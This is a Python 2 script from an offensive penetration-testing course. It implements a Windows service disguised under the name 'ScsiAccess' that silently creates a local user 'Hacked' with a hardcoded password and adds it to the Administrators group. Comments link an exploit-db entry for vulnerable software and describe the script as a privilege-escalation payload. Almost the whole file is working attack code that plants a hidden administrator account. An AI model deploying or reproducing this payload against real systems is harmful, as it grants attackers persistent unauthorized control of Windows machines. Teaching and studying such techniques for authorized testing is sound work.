# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

# Modified version of: 
# http://code.activestate.com/recipes/551780/

# Good to read
# https://attack.mitre.org/wiki/Privilege_Escalation
# https://msdn.microsoft.com/en-us/library/windows/desktop/ms685150(v=vs.85).aspx

# Download Vulnerable Software 
# https://www.exploit-db.com/exploits/24872/

# Pywin is needed to be installed first
# https://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/

import servicemanager
import win32serviceutil
import win32service
import win32api

import win32net
import win32netcon

import os
import ctypes

class Service(win32serviceutil.ServiceFramework):
    
    _svc_name_ = 'ScsiAccess'
    _svc_display_name_ = 'ScsiAccess'

    
    def __init__(self, *args):
        win32serviceutil.ServiceFramework.__init__(self, *args)
        
        
    def sleep(self, sec):
        win32api.Sleep(sec*1000, True)
        
    def SvcDoRun(self):

        self.ReportServiceStatus(win32service.SERVICE_START_PENDING)
        try:
            self.ReportServiceStatus(win32service.SERVICE_RUNNING)
            self.start()            
           
        except Exception, x:
            self.SvcStop()
   
            
    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.stop()
        self.ReportServiceStatus(win32service.SERVICE_STOPPED)

      
    def start(self):
        self.runflag=True
        
# inspired from
# http://timgolden.me.uk/python/win32_how_do_i/create-a-local-group-with-a-new-user.html

      #Define a new username called 'hacked' and make it belong to 'administrators' group.
         
        USER = "Hacked"
        GROUP = "Administrators"
        user_info = dict (   # create a user info profile in a dictionary format
               name = USER,
               password = "python_is_my_life", # Define the password for the 'hacked' username
               priv = win32netcon.USER_PRIV_USER,
               home_dir = None,
               comment = None,
               flags = win32netcon.UF_SCRIPT,
               script_path = None
                )

        user_group_info = dict (    # create a group info profile in a dictionary format
            domainandname = USER
           )

        try:
            win32net.NetUserAdd (None, 1, user_info)
            win32net.NetLocalGroupAddMembers (None, GROUP, 3, [user_group_info])
        except Exception, x:
            pass
            
            


        while self.runflag:  
            self.sleep(10)


                
    def stop(self): 
         self.runflag=False

if __name__ == '__main__':
    
    servicemanager.Initialize()
    servicemanager.PrepareToHostSingle(Service)
    servicemanager.StartServiceCtrlDispatcher()
    win32serviceutil.HandleCommandLine(Service)

